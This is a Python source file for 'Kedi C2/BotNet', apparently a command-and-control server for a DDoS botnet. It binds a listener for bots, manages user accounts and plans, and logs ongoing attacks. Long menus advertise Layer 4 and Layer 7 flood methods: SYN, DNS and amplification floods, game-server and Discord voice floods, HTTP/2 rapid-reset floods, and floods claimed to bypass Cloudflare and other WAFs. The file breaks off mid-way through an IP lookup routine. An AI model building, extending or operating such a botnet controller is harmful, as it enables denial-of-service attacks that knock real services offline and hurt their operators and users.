from socket import socket , AF_INET , SOCK_STREAM , SOL_SOCKET , SO_REUSEADDR
from threading import Thread as thr
from colorama import Fore , init
from datetime import datetime
from time import time , sleep
from json import load , dump
from pystyle import Colorate , Colors
from os import system , name , path
from requests import get
from urllib.parse import urlparse
from base64 import b64encode , b64decode
from urllib.parse import urlparse

init()

red = Fore.LIGHTRED_EX; green = Fore.LIGHTGREEN_EX; blue = Fore.LIGHTBLUE_EX; yellow = Fore.LIGHTYELLOW_EX; cyan = Fore.LIGHTCYAN_EX; white = Fore.LIGHTWHITE_EX; magenta = Fore.LIGHTMAGENTA_EX;

LIGHTGREEN = '\033[92m'
LIGHTYELLOW = '\033[93m'
LIGHTCYAN = '\033[96m'
LIGHTBLUE = '\033[94m'
LIGHTMAGENTA = '\033[95m'
LIGHTRED = '\033[91m'
LIGHTBLSYN = '\033[90m'
LIGHTWHITE = '\033[97m'
LIGHTPINK = "\x1b[38;5;206m"
LIGHTPURPLE = "\x1b[38;5;91m"
LIGHTAQUA = "\x1b[38;5;49m"
LIGHTBLACK = "\x1b[38;5;232m"
RESET = '\033[0;0m'

banner = f"""
                             ,MMM8&&&.
                        _...MMMMM88&&&&..._
                     .::'''MMMMM88&&&&&&'''::.
                    ::     MMMMM88&&&&&&     :: Kedi C2/BotNet 
                    '::....MMMMM88&&&&&&....::' Version 1.0
                       `''''MMMMM88&&&&''''`
                             'MMM8&&&'

		          ╚╦════════════════════════════════════════════╦╝
       ╔═════╩════════════════════════════════════════════╩═════╗

		  	          ✧ The Best C2/BotNet || By : - 𝙴𝚡𝚙𝚕𝚘!𝚝 ✧

       ╚════════════════════════════════════════════════════════╝"""

banner1 = """
\r
\r                             ,MMM8&&&.
\r                        _...MMMMM88&&&&..._
\r                     .::'''MMMMM88&&&&&&'''::.
\r                    ::     MMMMM88&&&&&&     :: Kedi C2/BotNet 
\r                    '::....MMMMM88&&&&&&....::' Version 1.0
\r                       `''''MMMMM88&&&&''''`
\r                             'MMM8&&&'
\r
\r            ╚╦════════════════════════════════════════════╦╝
\r       ╔═════╩════════════════════════════════════════════╩═════╗
\r
\r               ✧ The Best C2/BotNet || By : - 𝙴𝚡𝚙𝚕𝚘!𝚝 ✧
\r
\r       ╚════════════════════════════════════════════════════════╝\n

"""

with open("src/data.json" , encoding="utf-8") as filej:
    loadd = load(filej)
    filej.close()
    cnc_ip = str(loadd['cnc_ip'])
    cnc_port = int(loadd['cnc_port'])
    try:
        with open("src/data.json", encoding="utf-8") as filej:
            loadd = load(filej)
            cnc_ip = str(loadd['cnc_ip'])
            cnc_port = int(loadd['cnc_port'])
    except FileNotFoundError:
        print(f"{red}[{yellow}!{red}] {red}File 'src/data.json' not found !")
        exit()
    except KeyError as e:
        print(f"{red}[{yellow}!{red}] {red}Missing key in JSON {blue}:{red} {e}")
        exit()
try:
    s = socket(AF_INET , SOCK_STREAM)  
    s.setsockopt(SOL_SOCKET , SO_REUSEADDR , 1)
    s.bind((cnc_ip , cnc_port))
    s.listen()
    system('cls' if name == 'nt' else 'clear')
    print(Colorate.Horizontal(Colors.red_to_blue , banner , 2))
    print(f'\n {red}[{yellow}+{red}] {green}Connected {cyan}:)\n')
    print(f' {red}[{yellow}+{red}] {green}Logs {cyan}:))')
except OSError as e:
    print(f"{red}[{yellow}+{red}] {red}Cannot bind because the port is already in use or another issue occurred {blue}:{red} {e}")
    exit()
except Exception as e:
    print(f"{red}[{yellow}+{red}] {red}An unexpected error occurred: {e}")
    exit()

banner_xd = """\033c

\r⠀\033[92m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\r⠀⠀\033[92m⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\r⠀⠀⠀\033[92m⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\r⠀⠀⠀⠀\033[92m⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\r⠀⠀⠀⠀⠀\033[92m⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀⠀
\r⠀⠀⠀⠀⠀⠀\033[92m⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧⠀  Welcome To KediC2/Botnet
\r⠀⠀⠀\033[97m⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋⠀    \033[97mCreated By itzexploit
\r⠐⠀\033[97m⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋⠀⠀⠀        \033[97mVersion 1.0
\r⠈\033[97m⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀⠀⠀⠀⠀
\r⠠⠀\033[97m⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞⠀⠀⠀⠀
\r⠀⠀⠀⠀⠀⠀⠀⠀⠀\033[92m⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⠀⠀⠀⠀⠀
\r⠀⠀⠀⠀⠀\033[92m⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉\n \033[97m⠀⠀⠀⠀⠀

"""

file_path = 'ongoing_attacks.json'

def load_attacks():
    if path.exists(file_path):
        with open(file_path , 'r') as file:
            return load(file)
    return {}

def load_files(file_path='src/users.json'):
    try:
        if path.exists(file_path):
            with open(file_path , 'r') as file:
                return load(file)
        else:
            return {}
    except:
        pass

def save_files(data , file_path='src/users.json'):
    try:
        with open(file_path , 'w') as file:
            dump(data , file , indent=4)
    except:
        pass

def save_attacks(attacks):
    with open(file_path , 'a') as file:
        dump(attacks, file)

help = f"""
\r{LIGHTCYAN} ✧ {LIGHTWHITE}!{LIGHTMAGENTA}layer7          {LIGHTRED}:     {LIGHTGREEN}Layer7 Methods Banner  {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTWHITE}!{LIGHTMAGENTA}layer4          {LIGHTRED}:     {LIGHTGREEN}Layer4 Methods Banner  {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTWHITE}!{LIGHTMAGENTA}methods         {LIGHTRED}:     {LIGHTGREEN}Layer 7 & 4 Methods Banner  {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTWHITE}.{LIGHTMAGENTA}clear           {LIGHTRED}:     {LIGHTGREEN}Clear Page  {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTWHITE}.{LIGHTMAGENTA}home            {LIGHTRED}:     {LIGHTGREEN}Back to home  {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTWHITE}.{LIGHTMAGENTA}tools           {LIGHTRED}:     {LIGHTGREEN}Show Tools Menu  {LIGHTRED}•\
\r{LIGHTCYAN} ✧ {LIGHTWHITE}?{LIGHTMAGENTA}plan            {LIGHTRED}:     {LIGHTGREEN}Show Your Plan Info  {LIGHTRED}•n
\r{LIGHTRED} - {LIGHTMAGENTA}✿ {LIGHTGREEN}Kedi C2 {LIGHTRED}- {LIGHTYELLOW}Version 1.0 {LIGHTRED}- {LIGHTGREEN}Created By Exploit {LIGHTRED}- @{LIGHTBLUE}itzexpl0it {LIGHTMAGENTA}✿\n{LIGHTWHITE}
"""

help_admin = f"""
\r{LIGHTCYAN} ✧ {LIGHTWHITE}.{LIGHTMAGENTA}banuser         {LIGHTRED}:     {LIGHTGREEN}Ability to ban  {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTWHITE}.{LIGHTMAGENTA}unban           {LIGHTRED}:     {LIGHTGREEN}Ability to unban  {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTWHITE}.{LIGHTMAGENTA}adduser         {LIGHTRED}:     {LIGHTGREEN}Ability to add user  {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTWHITE}.{LIGHTMAGENTA}deluser         {LIGHTRED}:     {LIGHTGREEN}Ability to delere user  {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTWHITE}.{LIGHTMAGENTA}home            {LIGHTRED}:     {LIGHTGREEN}Back to home  {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTWHITE}.{LIGHTMAGENTA}tools           {LIGHTRED}:     {LIGHTGREEN}Show Tools Menu  {LIGHTRED}•\n
\r{LIGHTRED} - {LIGHTMAGENTA}✿ {LIGHTGREEN}Kedi C2 {LIGHTRED}- {LIGHTYELLOW}Version 1.0 {LIGHTRED}- {LIGHTGREEN}Created By Exploit {LIGHTRED}- @{LIGHTBLUE}itzexpl0it {LIGHTMAGENTA}✿\n{LIGHTWHITE}
"""

def text2Gen(word):
    start_color = (0, 0, 200)
    end_color   = (255, 0, 0)
    num_letters = len(word)
    step_r = (end_color[0] - start_color[0]) / num_letters
    step_g = (end_color[1] - start_color[1]) / num_letters
    step_b = (end_color[2] - start_color[2]) / num_letters
    reset_color = "\033[0m"
    current_color = start_color
    colored_word = ""
    for i, letter in enumerate(word):
        color_code = f"\033[38;2;{int(current_color[0])};{int(current_color[1])};{int(current_color[2])}m"
        colored_word += f"{color_code}{letter}{reset_color}"
        current_color = (current_color[0] + step_r, current_color[1] + step_g, current_color[2] + step_b)
    return colored_word

methods = f"""
\r{LIGHTRED} - {LIGHTYELLOW}Layer4\n
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}udp          {LIGHTRED}:     {LIGHTGREEN}UDP FLOOD RANDOM DATA  {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp          {LIGHTRED}:     {LIGHTGREEN}TCP FLOOD RANDOM DATA {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}gudp         {LIGHTRED}:     {LIGHTGREEN}UDP HEX FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}gtcp         {LIGHTRED}:     {LIGHTGREEN}TCP HEX FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}dns          {LIGHTRED}:     {LIGHTGREEN}DNS FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}syn          {LIGHTRED}:     {LIGHTGREEN}SYN FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}udp-bypass   {LIGHTRED}:     {LIGHTGREEN}UDP FLOOD & BEST HEX PAYLOAD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp-bypass   {LIGHTRED}:     {LIGHTGREEN}TCP FLOOD & BEST HEX PAYLOAD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}ts3          {LIGHTRED}:     {LIGHTGREEN}TS3 KILLER {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}fiv          {LIGHTRED}:     {LIGHTGREEN}FIVEM UDP MIX FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}vse          {LIGHTRED}:     {LIGHTGREEN}VALVE SOURCE ENGINE FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}pps          {LIGHTRED}:     {LIGHTGREEN}UDP & TCP MIX FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}game         {LIGHTRED}:     {LIGHTGREEN}TCP & UDP MIX ATTACK TO ALL GAMES {LIGHTBLUE}({LIGHTGREEN} MTA {LIGHTRED},{LIGHTGREEN} FIVEM {LIGHTRED},{LIGHTGREEN} MINCRAFT {LIGHTRED}, {LIGHTGREEN}DDNET {LIGHTRED},{LIGHTGREEN} CS2{LIGHTBLUE} ) {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}udp-raw      {LIGHTRED}:     {LIGHTGREEN}UDP RAW HEADER HEXADECIMAL WITH BYPASS FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp-raw      {LIGHTRED}:     {LIGHTGREEN}TCP RAW HEADER HEXADECIMAL WITH BYPASS FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}r6           {LIGHTRED}:     {LIGHTGREEN}RainbowSix ( R6 ) CUSTOM UDP HEADER BYPASS FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp-boom     {LIGHTRED}:     {LIGHTGREEN}TCP AMPLIFICATION & TCP BYPASS FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}udp-boom     {LIGHTRED}:     {LIGHTGREEN}WSD & UDP AMPLIFICATION & UDP BYPASS FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}discord      {LIGHTRED}:     {LIGHTGREEN}DISCORD VOICE UDP FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp-paf      {LIGHTRED}:     {LIGHTGREEN}TCP & PSH MIX FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp-conn     {LIGHTRED}:     {LIGHTGREEN}TCP FLOOD TO PROTECTED SSL & TLSV1.2 DATA {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp-hand     {LIGHTRED}:     {LIGHTGREEN}TCP HANDSHAKE HEX FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp-80       {LIGHTRED}:     {LIGHTGREEN}TCP FLOOD PORT 80 KILLER WITH HEX DATA {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}rdp          {LIGHTRED}:     {LIGHTGREEN}TCP FLOOD KILL RDP WITH HEX DATA {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}ssh          {LIGHTRED}:     {LIGHTGREEN}TCP FLOOD KILL SSH WITH HEX DATA {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp-storm    {LIGHTRED}:     {LIGHTGREEN}NORMAL TCP BYPASS WITH HEX DATA {LIGHTRED}•\n
\r{LIGHTRED} - {LIGHTYELLOW}Layer7\n
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}raw          {LIGHTRED}:     {LIGHTGREEN}HIGH PPS GET FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}get          {LIGHTRED}:     {LIGHTGREEN}GET FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}rapid-reset  {LIGHTRED}:     {LIGHTGREEN}HTTP/2.0 FLOOD USING LEGIT HEADERS WITH RAPID RESET EXPLOIT AND FLOOD WITH PROXY AND SSL , TLS {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}spoof        {LIGHTRED}:     {LIGHTGREEN}GET HEADER SPOOF FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}post         {LIGHTRED}:     {LIGHTGREEN}POST FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}put          {LIGHTRED}:     {LIGHTGREEN}PUT FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}bypass       {LIGHTRED}:     {LIGHTGREEN}HTTP1.1 FLOOD WITH SSL AND HEADER & IP SPOOF AND BYPASS ALL WAFs {LIGHTBLUE}({LIGHTGREEN} Cloudflare {LIGHTRED},{LIGHTGREEN} ArvanCloud {LIGHTRED},{LIGHTGREEN} Akamai {LIGHTRED},{LIGHTGREEN} Fastly{LIGHTBLUE} ) {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}browser      {LIGHTRED}:     {LIGHTGREEN}CHROME BASED FLOOD MADE FOR BYPASS CAPTCHA & UAM {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}http         {LIGHTRED}:     {LIGHTGREEN}GET FLOOD WITHOUT SSL , TLS {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}xmlrpc       {LIGHTRED}:     {LIGHTGREEN}WORDPRESS XMLRPC POST FLOOD WITH XML DATA {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}http-mix     {LIGHTRED}:     {LIGHTGREEN}GET & POST & HEAD MIX FLOOD HIGH PPS {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}spoof-storm  {LIGHTRED}:     {LIGHTGREEN}GET HEADER SPOOF FLOOD WITH PROXY HTTP AND HIGH PPS FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}https        {LIGHTRED}:     {LIGHTGREEN}GET HTTP/2.0 FLOOD WITH SSL , TLS AND FLOOD WITH PROXY & HIGH PPS {LIGHTRED}•\n
\r{LIGHTRED} - {LIGHTMAGENTA}✿ {LIGHTGREEN}Kedi C2 {LIGHTRED}- {LIGHTYELLOW}Version 1.0 {LIGHTRED}- {LIGHTGREEN}Created By Exploit {LIGHTRED}- @{LIGHTBLUE}itzexpl0it {LIGHTMAGENTA}✿\n{LIGHTWHITE}
"""

tools = f"""

\r{LIGHTRED} - {LIGHTYELLOW}Tools\n
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}.clear        {LIGHTRED}:     {LIGHTGREEN}CLEAR PAGE {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}.home         {LIGHTRED}:     {LIGHTGREEN}BACK TO HOME PAGE {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}.lookup       {LIGHTRED}:     {LIGHTGREEN}LOOKUP IP & WEBSITE {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}.paping       {LIGHTRED}:     {LIGHTGREEN}TCP PING {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}.bots         {LIGHTRED}:     {LIGHTGREEN}SHOW BOTS COUNT {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}.ongoing      {LIGHTRED}:     {LIGHTGREEN}SHOWS CURRENT ATTACKS {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}!methods      {LIGHTRED}:     {LIGHTGREEN}SHOW LAYER7 & LAYER4 METHODS {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}!print        {LIGHTRED}:     {LIGHTGREEN}PRINT A WORD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}!base64-ecd   {LIGHTRED}:     {LIGHTGREEN}BASE 64 ENCODE {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}!base64-dcd   {LIGHTRED}:     {LIGHTGREEN}BASE 64 DECODE {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}!u2t          {LIGHTRED}:     {LIGHTGREEN}CONVERT URL TO TARGET {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}!t2u          {LIGHTRED}:     {LIGHTGREEN}CONVERT TARGET TO URL {LIGHTRED}•\n
\r{LIGHTRED} - {LIGHTMAGENTA}✿ {LIGHTGREEN}Kedi C2 {LIGHTRED}- {LIGHTYELLOW}Version 1.0 {LIGHTRED}- {LIGHTGREEN}Created By Exploit {LIGHTRED}- @{LIGHTBLUE}itzexpl0it {LIGHTMAGENTA}✿\n{LIGHTWHITE}
"""

layer7 = f"""

\r{LIGHTRED} - {LIGHTYELLOW}Layer7\n
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}raw          {LIGHTRED}:     {LIGHTGREEN}HIGH PPS GET FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}get          {LIGHTRED}:     {LIGHTGREEN}GET FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}rapid-reset  {LIGHTRED}:     {LIGHTGREEN}HTTP/2.0 FLOOD USING LEGIT HEADERS WITH RAPID RESET EXPLOIT AND FLOOD WITH PROXY AND SSL , TLS {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}spoof        {LIGHTRED}:     {LIGHTGREEN}GET HEADER SPOOF FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}post         {LIGHTRED}:     {LIGHTGREEN}POST FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}put          {LIGHTRED}:     {LIGHTGREEN}PUT FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}bypass       {LIGHTRED}:     {LIGHTGREEN}HTTP1.1 FLOOD WITH SSL AND HEADER & IP SPOOF AND BYPASS ALL WAFs {LIGHTBLUE}({LIGHTGREEN} Cloudflare {LIGHTRED},{LIGHTGREEN} ArvanCloud {LIGHTRED},{LIGHTGREEN} Akamai {LIGHTRED},{LIGHTGREEN} Fastly{LIGHTBLUE} ) {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}browser      {LIGHTRED}:     {LIGHTGREEN}CHROME BASED FLOOD MADE FOR BYPASS CAPTCHA & UAM {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}http         {LIGHTRED}:     {LIGHTGREEN}GET FLOOD WITHOUT SSL , TLS {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}xmlrpc       {LIGHTRED}:     {LIGHTGREEN}WORDPRESS XMLRPC POST FLOOD WITH XML DATA {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}http-mix     {LIGHTRED}:     {LIGHTGREEN}GET & POST & HEAD MIX FLOOD HIGH PPS {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}spoof-storm  {LIGHTRED}:     {LIGHTGREEN}GET HEADER SPOOF FLOOD WITH PROXY HTTP AND HIGH PPS FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}https        {LIGHTRED}:     {LIGHTGREEN}GET HTTP/2.0 FLOOD WITH SSL , TLS AND FLOOD WITH PROXY & HIGH PPS {LIGHTRED}•\n
\r{LIGHTRED} - {LIGHTMAGENTA}✿ {LIGHTGREEN}Kedi C2 {LIGHTRED}- {LIGHTYELLOW}Version 1.0 {LIGHTRED}- {LIGHTGREEN}Created By Exploit {LIGHTRED}- @{LIGHTBLUE}itzexpl0it {LIGHTMAGENTA}✿\n{LIGHTWHITE}
"""

layer4 = f"""

\r{LIGHTRED} - {LIGHTYELLOW}Layer4\n
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}udp          {LIGHTRED}:     {LIGHTGREEN}UDP FLOOD RANDOM DATA  {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp          {LIGHTRED}:     {LIGHTGREEN}TCP FLOOD RANDOM DATA {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}gudp         {LIGHTRED}:     {LIGHTGREEN}UDP HEX FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}gtcp         {LIGHTRED}:     {LIGHTGREEN}TCP HEX FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}dns          {LIGHTRED}:     {LIGHTGREEN}DNS FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}syn          {LIGHTRED}:     {LIGHTGREEN}SYN FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}udp-bypass   {LIGHTRED}:     {LIGHTGREEN}UDP FLOOD & BEST HEX PAYLOAD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp-bypass   {LIGHTRED}:     {LIGHTGREEN}TCP FLOOD & BEST HEX PAYLOAD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}ts3          {LIGHTRED}:     {LIGHTGREEN}TS3 KILLER {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}fiv          {LIGHTRED}:     {LIGHTGREEN}FIVEM UDP MIX FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}vse          {LIGHTRED}:     {LIGHTGREEN}VALVE SOURCE ENGINE FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}pps          {LIGHTRED}:     {LIGHTGREEN}UDP & TCP MIX FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}game         {LIGHTRED}:     {LIGHTGREEN}TCP & UDP MIX ATTACK TO ALL GAMES {LIGHTBLUE}({LIGHTGREEN} MTA {LIGHTRED},{LIGHTGREEN} FIVEM {LIGHTRED},{LIGHTGREEN} MINCRAFT {LIGHTRED}, {LIGHTGREEN}DDNET {LIGHTRED},{LIGHTGREEN} CS2{LIGHTBLUE} ) {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}udp-raw      {LIGHTRED}:     {LIGHTGREEN}UDP RAW HEADER HEXADECIMAL WITH BYPASS FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp-raw      {LIGHTRED}:     {LIGHTGREEN}TCP RAW HEADER HEXADECIMAL WITH BYPASS FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}r6           {LIGHTRED}:     {LIGHTGREEN}RainbowSix ( R6 ) CUSTOM UDP HEADER BYPASS FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp-boom     {LIGHTRED}:     {LIGHTGREEN}TCP AMPLIFICATION & TCP BYPASS FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}udp-boom     {LIGHTRED}:     {LIGHTGREEN}WSD & UDP AMPLIFICATION & UDP BYPASS FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}discord      {LIGHTRED}:     {LIGHTGREEN}DISCORD VOICE UDP FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp-paf      {LIGHTRED}:     {LIGHTGREEN}TCP & PSH MIX FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp-conn     {LIGHTRED}:     {LIGHTGREEN}TCP FLOOD TO PROTECTED SSL & TLSV1.2 DATA {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp-hand     {LIGHTRED}:     {LIGHTGREEN}TCP HANDSHAKE HEX FLOOD {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp-80       {LIGHTRED}:     {LIGHTGREEN}TCP FLOOD PORT 80 KILLER WITH HEX DATA {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}rdp          {LIGHTRED}:     {LIGHTGREEN}TCP FLOOD KILL RDP WITH HEX DATA {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}ssh          {LIGHTRED}:     {LIGHTGREEN}TCP FLOOD KILL SSH WITH HEX DATA {LIGHTRED}•
\r{LIGHTCYAN} ✧ {LIGHTMAGENTA}tcp-storm    {LIGHTRED}:     {LIGHTGREEN}NORMAL TCP BYPASS WITH HEX DATA {LIGHTRED}•\n
\r{LIGHTRED} - {LIGHTMAGENTA}✿ {LIGHTGREEN}Kedi C2 {LIGHTRED}- {LIGHTYELLOW}Version 1.0 {LIGHTRED}- {LIGHTGREEN}Created By Exploit {LIGHTRED}- @{LIGHTBLUE}itzexpl0it {LIGHTMAGENTA}✿\n{LIGHTWHITE}
"""

kedis = []
online_users = []

banne = text2Gen(banner1)

def isp(target , conn):
    now = datetime.now()
    current_datetime = datetime.now()
    date = current_datetime.date()
    timee = now.strftime('%H:%M:%S')
    response = get(f"http://ip-api.com/json/{target}")
    response.raise_for_status()
    dat = response.json()
    isp = dat['as']
    city = dat['city']
    zone = dat['timezone']
    isp_banner = f"""
\r{LIGHTCYAN}╔══════════════════════════════════════════════════════════════════╗
\r{LIGHTYELLOW} Date   {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTGREEN}{date}{LIGHTYELLOW} ]
\r{LIGHTYELLOW} Time   {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTGREEN}{timee}{LIGHTYELLOW} ]
\r{LIGHTYELLOW} Isp    {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTGREEN}{isp}{LIGHTYELLOW} ]
\r{LIGHTYELLOW} Zone   {LIGHTRED}: {LIGHTYELLOW}[ {LIGHTGREEN}{zone}{LIGHTYELLOW} ]
